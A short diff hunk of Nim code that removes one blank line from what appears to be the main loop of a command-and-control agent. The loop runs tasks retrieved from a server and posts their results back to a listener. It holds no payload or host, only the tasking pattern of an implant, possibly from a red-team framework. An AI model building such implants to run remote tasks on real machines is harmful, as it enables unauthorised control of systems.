@@ -45,7 +45,6 @@ proc main() =
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
             let result = task.handleTask()
-
             discard postResults(listener, agent, result)
             
 when isMainModule: 
